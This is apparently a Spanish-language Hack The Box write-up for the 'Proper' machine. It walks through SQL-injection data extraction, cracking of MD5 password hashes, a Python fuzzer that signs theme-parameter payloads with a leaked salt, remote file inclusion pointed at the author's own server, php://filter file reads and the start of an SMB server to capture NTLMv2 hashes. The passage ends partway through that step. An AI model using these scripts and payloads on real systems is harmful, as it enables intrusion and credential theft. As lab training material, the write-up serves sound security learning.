&lt;h3 id=&quot;web-sqli-tables&quot;&gt;Extraemos las tablas de la base de datos &lt;u&gt;cleaner&lt;/u&gt; &lt;a href=&quot;#web-sqli-tables&quot;&gt;ü™ì&lt;/a&gt;&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;a href=&quot;https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/proper/sqli/tables.py&quot;&gt;tables.py&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321bash_scriptPY_sqli_tables_cleaner.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Bien, tambi√©n hay varias tablas, veamos la de los clientes primero‚Ä¶&lt;/p&gt;

&lt;h3 id=&quot;web-sqli-columns&quot;&gt;Extraemos las columnas de la tabla &lt;u&gt;customers&lt;/u&gt; &lt;a href=&quot;#web-sqli-columns&quot;&gt;ü™ì&lt;/a&gt;&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;a href=&quot;https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/proper/sqli/columns.py&quot;&gt;columns.py&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321bash_scriptPY_sqli_columns_cleanerYcustomers.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora intentemos dumpear los campos principales, el &lt;code&gt;id&lt;/code&gt;, el usuario (&lt;code&gt;login&lt;/code&gt;) y su &lt;code&gt;password&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;web-sqli-info&quot;&gt;Extraemos informaci√≥n de las columnas &lt;a href=&quot;#web-sqli-info&quot;&gt;ü™ì&lt;/a&gt;&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;a href=&quot;https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/proper/sqli/info.py&quot;&gt;info.py&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Con el script podemos indicarle varios campos, por ejemplo &lt;code&gt;id&lt;/code&gt; y &lt;code&gt;login&lt;/code&gt; separados por comas (&lt;code&gt;,&lt;/code&gt;), y nos devolver√≠a el resultado de cada uno pero separado por &lt;code&gt;-&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321bash_scriptPY_sqli_info_cleanerYcustomersYid_login.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Bien, hay varios usuarios (no dumpeo todo porque nos echamos ac√° la vida entera :P, pero los hay) y tenemos unos correos‚Ä¶ Caemos en cuenta del recurso que encontramos antes en nuestra enumeraci√≥n, &lt;code&gt;/licenses&lt;/code&gt;, nos mostraba un panel login que ped√≠a exactamente eso, un mail.&lt;/p&gt;

&lt;p&gt;Pero claro, nos falta la contrase√±a, pues extraigamos las dos primeras a ver si podemos hacer algo con ellas:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321bash_scriptPY_sqli_info_cleanerYcustomersYid_passwordMD5.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si nos fijamos la contrase√±a siempre tiene el formato de ser un hash &lt;code&gt;MD5&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;‚õ∑Ô∏è &lt;strong&gt;&lt;em&gt;La codificaci√≥n del MD5 de 128 bits es representada t√≠picamente como un n√∫mero de 32 s√≠mbolos hexadecimales.&lt;/em&gt;&lt;/strong&gt; &lt;a href=&quot;https://es.wikipedia.org/wiki/MD5&quot;&gt;Wikipedia&lt;/a&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;Toma de la &lt;code&gt;a&lt;/code&gt; a la &lt;code&gt;f&lt;/code&gt;, de la &lt;code&gt;A&lt;/code&gt; a la &lt;code&gt;F&lt;/code&gt; y del &lt;code&gt;0&lt;/code&gt; al &lt;code&gt;9&lt;/code&gt;&lt;/strong&gt;.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Por lo que para agilizar la extracci√≥n podemos pasarle √∫nicamente s√≠mbolos hexadecimales como diccionario:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-py&quot;&gt;...
dic = string.hexdigits + &quot;-¬£&quot;
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y volvemos a ejecutar‚Ä¶&lt;/p&gt;

&lt;p&gt;Mientras el script corre podemos jugar con los dos hashes de antes, probablemente sean crackeables, intent√©moslo.&lt;/p&gt;

&lt;p&gt;Los guardamos en un archivo junto a su usuario (o no, como quieran):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± cat hashes 
vikki.solomon@throwaway.mail:7c6a180b36896a0a8c02787eeafb0e4c
nstone@trashbin.mail:6cb75f652a9b52798eb6cf2201057c73
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora usamos &lt;code&gt;John The Ripper&lt;/code&gt; y el diccionario &lt;code&gt;rockyou.txt&lt;/code&gt; para intentar crackearlas:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± john --wordlist=/usr/share/wordlists/rockyou.txt hashes --format=Raw-MD5
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y en menos de un segundo vemos esto:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
Press 'q' or Ctrl-C to abort, almost any other key for status
password1        (vikki.solomon@throwaway.mail)
password2        (nstone@trashbin.mail)
2g 0:00:00:00 DONE (2021-03-18 25:25) 11.76g/s 6776p/s 6776c/s 9035C/s football1..summer1
Use the &quot;--show --format=Raw-MD5&quot; options to display all of the cracked passwords reliably
Session completed
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Existen similitudes con los hashes para los dos usuarios (: YYYYYYYYYYYYY tenemos dos contrase√±as para probar en el login panel.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;licenses-web-part&quot;&gt;Validamos credenciales en el login de &lt;u&gt;/licenses&lt;/u&gt; &lt;a href=&quot;#licenses-web-part&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Listo, ahora que tenemos credenciales podemos probar ante el login panel en &lt;code&gt;/licenses&lt;/code&gt; y ver si conseguimos entrar, probemos con el primer usuario:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code&gt;vikki.solomon@throwaway.mail&lt;/code&gt; -&amp;gt; &lt;code&gt;password1&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321page80_licenses_loginDone.png&quot; alt=&quot;321page80_licenses_loginDone&quot; /&gt;&lt;/p&gt;

&lt;p&gt;VAMONOOOOOOOOOOOOOOOOOOOOOOOOOOOS, tenemos acceso al login panel.&lt;/p&gt;

&lt;p&gt;Vemos los productos del usuario, as√≠ que suponemos que cada usuario puede tener m√°s o menos productos (de los productos que vimos al inicio).&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Ya podemos dejar de descubrir hashes con nuestro script :P&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Tambi√©n en el header tenemos 3 links que hacen que nuestro ‚Äútheme‚Äù o estilo de la web cambie‚Ä¶&lt;/p&gt;

&lt;p&gt;Dando vueltas buscando vulnerabilidades con alguno de los ‚Äúthemes‚Äù y volviendo a leer algunos otros a ver si era que se me hab√≠a pasado alguno en el que fuera necesario estar autenticado para poder ser explotado no encontr√© nada √∫til‚Ä¶&lt;/p&gt;

&lt;p&gt;Despu√©s de un rato pens√© en hacer un script que actuara como fuzzer a ver si encontr√°bamos otros ‚Äúthemes‚Äù, para que tomara cada directorio o archivo y lo concatenara con la &lt;code&gt;salt&lt;/code&gt; y hacer el mismo proceso de antes, enviar el payload con su respectivo &lt;code&gt;hash&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Pero en su ejecuci√≥n final terminamos encontrando algo mejor:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-py&quot;&gt;#!/usr/bin/python3

import requests
import hashlib
import signal

# Ctrl + C
def def_handler(sig, frame):
    print(&quot;\nCancelado por el usuario, saliendo...\n&quot;)
    exit(1)

signal.signal(signal.SIGINT, def_handler)

# Proceso login y fuzz
url = &quot;http://proper.htb/licenses&quot;

def fuzzing(session):
    salt = &quot;hie0shah6ooNoim&quot;

    with open('/opt/SecLists/Discovery/Web-Content/raft-small-directories.txt', 'r') as wordlist:
        for line in wordlist:
            # Quitamos espacios finales de la cadena
            payload = line.rstrip(&quot;\n&quot;)
            # Generamos hash: md5(salt+payload)
            hashh = hashlib.md5(salt.encode('utf-8') + payload.encode('utf-8')).hexdigest()

            cookie = session.cookies.get_dict()
            parameters = &quot;?theme=&quot; + payload + &quot;&amp;amp;h=&quot; + hashh

            r = session.get(url + &quot;/licenses.php&quot; + parameters, cookies=cookie)

            print(&quot;\n[+] \&quot;Theme\&quot;: %s -&amp;gt; %s&quot; % (payload, parameters))
            print(r.text)

def login():
    session = requests.Session()

    data_post = {
        &quot;username&quot; : &quot;vikki.solomon@throwaway.mail&quot;,
        &quot;password&quot; : &quot;password1&quot;
    }

    r = session.post(url + &quot;/index.php&quot;, data=data_post)
    fuzzing(session)

if __name__ == '__main__':
    login()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;(QUE JESO ‚Üë)&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Lo que estamos haciendo es sencillo, resumidamente por si te perdiste:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Primero iniciamos sesi√≥n para poder hacer peticiones a la ruta &lt;code&gt;/licenses.php&lt;/code&gt; con la sesi√≥n de &lt;code&gt;vikki&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Tomamos cada l√≠nea del wordlist y lo concatenamos con la &lt;code&gt;salt&lt;/code&gt; (como antes).&lt;/li&gt;
  &lt;li&gt;Y simplemente hacemos la petici√≥n, donde los par√°metros son: &lt;code&gt;theme=&amp;lt;linea&amp;gt;&lt;/code&gt; y &lt;code&gt;h=&amp;lt;hash&amp;gt;&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;As√≠ que por ejemplo, llega la l√≠nea &lt;code&gt;hola&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-py&quot;&gt;&amp;gt;&amp;gt;&amp;gt; import hashlib
&amp;gt;&amp;gt;&amp;gt; salt = &quot;hie0shah6ooNoim&quot;
&amp;gt;&amp;gt;&amp;gt; payload = &quot;hola&quot;
&amp;gt;&amp;gt;&amp;gt; hash = hashlib.md5(salt.encode() + payload.encode()).hexdigest()
&amp;gt;&amp;gt;&amp;gt; print(&quot;MD5(%s + %s) = Hash: %s&quot; % (salt, payload, hash))
MD5(hie0shah6ooNoim + hola) = Hash: 5557007e63c9d95d45ca15a39ff4a5d6
&amp;gt;&amp;gt;&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Entonces finalmente la consulta que har√≠a seria:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;?theme=hola&amp;amp;h=5557007e63c9d95d45ca15a39ff4a5d6
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;(FIN‚Ä¶)&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Entonces al ejecutarlo, vemos esto con cualquier petici√≥n que hace:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321bash_licensesPY_error_foundPHP.png&quot; alt=&quot;321bash_licensesPY_error_foundPHP&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Opa, el principal error es que intenta llamar un archivo, pero no lo encuentra (en el caso de la imagen intenta abrir el ‚Äútheme‚Äù &lt;strong&gt;intranet&lt;/strong&gt; en la ruta &lt;code&gt;intranet/header.inc&lt;/code&gt;).&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;web-rfi&quot;&gt;Estudiamos posible &lt;u&gt;Remote File Inclusion&lt;/u&gt; en la web &lt;a href=&quot;#web-rfi&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Ahora, revisando detalladamente el error nos damos cuenta del uso de la funci√≥n:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt; 31 | // Following function securely includes a file. Whenever we
 32 | // will encounter a PHP tag we will just bail out here.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Aseguran la inclusi√≥n de un archivo, donde si se encuentra un tag de &lt;strong&gt;PHP&lt;/strong&gt; (&lt;code&gt;&amp;lt;?&lt;/code&gt;) en el contenido del mismo, simplemente muestra error y no hace el include:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-py&quot;&gt; 33 | function secure_include($file) {
 34 |   if (strpos(file_get_contents($file),'&amp;lt;?') === false) {     &amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt; Error encountered in this line.
 35 |     include($file);
 36 |   } else {
 37 |     http_response_code(403);
 38 |     die('Forbidden - Tampering attempt detected.');
 39 |   }
 40 | }
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;a href=&quot;https://www.php.net/manual/es/function.strpos.php&quot;&gt;strpos&lt;/a&gt; encuentra la &lt;strong&gt;posici√≥n&lt;/strong&gt; de la primera ocurrencia (cuando encuentra X cadena) en X contenido‚Ä¶&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;code&gt;$a&lt;/code&gt; === &lt;code&gt;$b&lt;/code&gt; / Id√©ntico / &lt;code&gt;true&lt;/code&gt; si &lt;code&gt;$a&lt;/code&gt; es igual a &lt;code&gt;$b&lt;/code&gt;, y la variable es del &lt;strong&gt;mismo tipo&lt;/strong&gt;.&lt;/p&gt;
  &lt;blockquote&gt;
    &lt;p&gt;&lt;a href=&quot;https://www.php.net/manual/es/language.operators.comparison.php&quot;&gt;Operadores de comparaci√≥n en &lt;strong&gt;PHP&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt;
  &lt;/blockquote&gt;
&lt;/blockquote&gt;

&lt;p&gt;¬øSe entiende lo que hace la funci√≥n y el uso de &lt;code&gt;strpos&lt;/code&gt;? Simulemos esto para que quede m√°s claro:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://paiza.io/es/projects/new&quot;&gt;Editor &lt;strong&gt;PHP&lt;/strong&gt; online&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&amp;lt;?php

// Digamos que este es el contenido del archivo, un simple hola en codigo PHP.
$contenido_archivo = &quot;&amp;lt;?php echo 'Hola'; ?&amp;gt;&quot;;

// Validamos que en el contenido este la cadena  &amp;lt;?, si esta, la validacion se vuelve  true  y nos muestra el error.
if (strpos($contenido_archivo, '&amp;lt;?') === false) {
    echo &quot;Contenido: &quot;.$contenido_archivo.&quot;\n&quot;;
    echo &quot;Tamos bien&quot;;
}
else {
    echo &quot;Contenido: &quot;.$contenido_archivo.&quot;\n&quot;;
    echo &quot;Error, tag detectado :P&quot;;
}

?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ejecutamos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;Contenido: &amp;lt;?php echo 'Hola'; ?&amp;gt;
Error, tag detectado :P
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y si cambiamos el orden del &lt;code&gt;&amp;lt;?&lt;/code&gt; igual seguimos teniendo el error :P&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;Contenido: php echo 'Hola'; &amp;lt;?php echo ''; ?&amp;gt;
Error, tag detectado :P
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si le quitamos el &lt;strong&gt;tag&lt;/strong&gt; y ejecutamos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;Contenido: php echo 'ahora no hay tag inicial'; ?&amp;gt;
Tamos bien
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Listo, sabienod que hace y como funciona el &lt;code&gt;strpos&lt;/code&gt; podemos seguir‚Ä¶&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;p&gt;Sabemos que en este caso el error que nos muestra es por que no encuentra el archivo para cargar el ‚Äútheme‚Äù, pero ahora sabemos tambien que valida su contenido en busca de algun tag &lt;strong&gt;PHP&lt;/strong&gt;‚Ä¶&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Por si no quieres ver todos los fallos que hice te dejo dos opciones:&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;ü§ç &lt;a href=&quot;#testing-securefunc&quot;&gt;Test con el posible &lt;strong&gt;RFI&lt;/strong&gt;, testeando y dando algunas explicaciones de m√°s yyyy m√°s testeo&lt;/a&gt;.&lt;br /&gt;
‚ù§Ô∏è &lt;a href=&quot;#found-ntlmv2&quot;&gt;Jugando con el &lt;strong&gt;RFI&lt;/strong&gt; logramos interceptar un hash &lt;strong&gt;NTLMv2&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;testing-securefunc&quot;&gt;Testaaando y confirmando &lt;u&gt;Remote File Inclusion&lt;/u&gt; &lt;a href=&quot;#testing-securefunc&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Jugando con esto se me ocurri√≥ levantar un servidor web e intentar cargar un archivo X como ‚Äútheme‚Äù, modificando el script quedar√≠a as√≠:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-py&quot;&gt;...
def fuzzing(session):
    salt = &quot;hie0shah6ooNoim&quot;
    payload = &quot;http://10.10.14.178:8000/locuras&quot;

    # Generamos hash: md5(salt+payload)
    hashh = hashlib.md5(salt.encode('utf-8') + payload.encode('utf-8')).hexdigest()

    cookie = session.cookies.get_dict()
    parameters = &quot;?theme=&quot; + payload + &quot;&amp;amp;h=&quot; + hashh

    r = session.get(url + &quot;/licenses.php&quot; + parameters, cookies=cookie)

    print(&quot;\n[+] \&quot;Theme\&quot;: %s -&amp;gt; %s&quot; % (payload, parameters))
    print(r.text)
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Levantamos el servidor:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù≠ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y ejecutamos, vemos que intenta cargar el ‚Äútheme‚Äù:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;[+] &quot;Theme&quot;: http://10.10.14.178:8000/locuras -&amp;gt; ?theme=http://10.10.14.178:8000/locuras&amp;amp;h=63b61941e36339f3b23fc614b16a3124
&amp;lt;!-- [2] file_get_contents(http://10.10.14.178:8000/locuras/header.inc): failed to open stream: HTTP request failed! HTTP/1.0 404 File not found
...
&amp;lt;!-- [2] include(): http:// wrapper is disabled in the server configuration by allow_url_include=0
...
&amp;lt;!-- [2] include(http://10.10.14.178:8000/locuras/header.inc): failed to open stream: no suitable wrapper could be found
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y en nuestro servidor:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;10.10.10.231 - - [25/Mar/2021 25:25:25] code 404, message File not found
10.10.10.231 - - [25/Mar/2021 25:25:25] &quot;GET /locuras/header.inc HTTP/1.0&quot; 404 -
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;üòÆ vemos en los errores de &lt;strong&gt;PHP&lt;/strong&gt; que no esta habilitado el incluir archivos mediante una &lt;strong&gt;URL&lt;/strong&gt;, pero obtenemos la petici√≥n en nuestro servidor de &lt;strong&gt;Python&lt;/strong&gt;, probemos a ver que podemos lograr con esto‚Ä¶&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Siempre har√° la petici√≥n buscando un archivo &lt;code&gt;header.inc&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Esto lo hace concatenando el directorio (payload que le podemos pasar) con &lt;code&gt;/header.inc&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href=&quot;https://stackoverflow.com/questions/7129842/what-is-an-inc-and-why-use-it&quot;&gt;.inc files&lt;/a&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321google_incFiles.png&quot; alt=&quot;321google_incFiles&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Jugando un rato -logramos- extraer los archivos &lt;code&gt;header.inc&lt;/code&gt; de cada &lt;em&gt;theme&lt;/em&gt;, esto usando &lt;a href=&quot;https://www.php.net/manual/en/wrappers.php&quot;&gt;wrappers&lt;/a&gt; (antes vimos que el &lt;strong&gt;wrapper&lt;/strong&gt; &lt;code&gt;http&lt;/code&gt; estaba deshabilitado), por ejemplo usando el &lt;strong&gt;wrapper&lt;/strong&gt; &lt;code&gt;php://&lt;/code&gt; para que junto a un filtro convierta el contenido de un archivo a &lt;code&gt;base64&lt;/code&gt; (esto es importante para archivos &lt;code&gt;PHP&lt;/code&gt;, ya que son interpretados y no podr√≠amos ver su contenido si los llamamos as√≠ como as√≠ e.e) para posteriormente copiar la cadena, decodearla y guardar su resultado en un archivo.&lt;/p&gt;

&lt;p&gt;As√≠ ver√≠amos el contenido del archivo, hag√°moslo para el &lt;code&gt;header.inc&lt;/code&gt; del &lt;em&gt;theme&lt;/em&gt; &lt;code&gt;solar&lt;/code&gt;:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://ironhackers.es/herramientas/lfi-cheat-sheet/&quot;&gt;&lt;strong&gt;PHP&lt;/strong&gt; wrappers - Cheat Sheet&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;(&lt;strong&gt;&lt;em&gt;Agregu√© el tomar el payload desde la terminal, que pereza estar entrando a cambiarlo a mano :P&lt;/em&gt;&lt;/strong&gt;)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù≠ python3 licenses.py &quot;php://filter/convert.base64-encode/resource=solar&quot;

[+] &quot;Theme&quot;: php://filter/convert.base64-encode/resource=solar -&amp;gt; ?theme=php://filter/convert.base64-encode/resource=solar&amp;amp;h=da608eae83164e4c3ff7d60869eeed12

PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KICA8aGVhZD4KICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KICAgIDx0aXRsZT5MaWNlbnNlczwvdGl0bGU+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEiPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJzb2xhci9ib290c3RyYXAubWluLmNzcyI+CiAgPC9oZWFkPgo=
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;üî¢ &lt;strong&gt;&lt;em&gt;Archivo &lt;a href=&quot;https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/proper/licenses.py&quot;&gt;licenses.py&lt;/a&gt; final&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Lo que hace por detr√°s la funci√≥n del c√≥digo &lt;strong&gt;PHP&lt;/strong&gt; es:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;include(php://filter/convert.base64-encode/resource=solar/header.inc)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Tomamos la cadena, la decodeamos y guardamos en un archivo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù≠ echo &quot;PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KICA8aGVhZD4KICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KICAgIDx0aXRsZT5MaWNlbnNlczwvdGl0bGU+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEiPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJzb2xhci9ib290c3RyYXAubWluLmNzcyI+CiAgPC9oZWFkPgo=&quot; | base64 -d &amp;gt; solarheader.inc
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Yyy:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù≠ cat solarheader.inc
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html lang=&quot;en&quot;&amp;gt;
  &amp;lt;head&amp;gt;
    &amp;lt;meta charset=&quot;utf-8&quot;&amp;gt;
    &amp;lt;title&amp;gt;Licenses&amp;lt;/title&amp;gt;
    &amp;lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&amp;gt;
    &amp;lt;link rel=&quot;stylesheet&quot; href=&quot;solar/bootstrap.min.css&quot;&amp;gt;
  &amp;lt;/head&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Solamente vemos las cabeceras que llaman el &lt;code&gt;css&lt;/code&gt; de cada &lt;strong&gt;&lt;em&gt;theme&lt;/em&gt;&lt;/strong&gt;, o sea para cambiar el fondo de la web :(&lt;/p&gt;

&lt;p&gt;üèãÔ∏è Simplemente unos recursos que me gustaron, pero en la pr√°ctica no me funcionaron üò•:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://security.stackexchange.com/questions/181704/exploit-lfi-bug-when-a-inc-php-is-appended-to-the-file-name&quot;&gt;Exploit LFI bug when a inc php is appended to the file name&lt;/a&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://gupta-bless.medium.com/exploiting-local-file-inclusion-lfi-using-php-wrapper-89904478b225&quot;&gt;Exploiting local file inclusion LFI using php wrapper&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;found-ntlmv2&quot;&gt;Jugando con el &lt;u&gt;RFI&lt;/u&gt; interceptamos un hash &lt;strong&gt;NTLMv2&lt;/strong&gt; &lt;a href=&quot;#found-ntlmv2&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Encontramos &lt;a href=&quot;https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion&quot;&gt;este recurso&lt;/a&gt; y leyendo vemos un paso que no hab√≠amos intentado:&lt;/p&gt;

&lt;p&gt;üé´ &lt;strong&gt;Bypass allow_url_include&lt;/strong&gt;:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;When &lt;code&gt;allow_url_include&lt;/code&gt; and &lt;code&gt;allow_url_fopen&lt;/code&gt; are set to Off. It is still possible to include a remote file on Windows box using the &lt;code&gt;smb protocol&lt;/code&gt;.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Ojiiiiiito, no hab√≠amos intentado el compartirnos una carpeta con &lt;strong&gt;SMB&lt;/strong&gt; y desde el &lt;strong&gt;RFI&lt;/strong&gt; intentar conectarnos a ella, prob√©moslo‚Ä¶&lt;/p&gt;

&lt;p&gt;Si recordamos, &lt;code&gt;allow_url_include&lt;/code&gt; esta seteado a &lt;code&gt;0&lt;/code&gt; (o sea apagado &lt;em&gt;Off&lt;/em&gt;), lo vimos cuando intentamos llamar el recurso a trav√©s de nuestra URL‚Ä¶ As√≠ que podemos probar los siguientes pasos:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Compartir una carpeta mediante &lt;strong&gt;SMB&lt;/strong&gt; donde tengamos el archivo que queramos llamar.&lt;/li&gt;
  &lt;li&gt;Y desde la petici√≥n agregar &lt;code&gt;\\&amp;lt;ip&amp;gt;\&amp;lt;folder&amp;gt;\&amp;lt;file&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Entonces, levantemos el servidor SMB, donde la carpeta compartida se llama &lt;code&gt;smbFolder&lt;/code&gt; y tomara todos los archivos de la ruta actual (&lt;code&gt;$(pwd)&lt;/code&gt;):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù≠ python3 smbserver.py smbFolder $(pwd) -smb2support
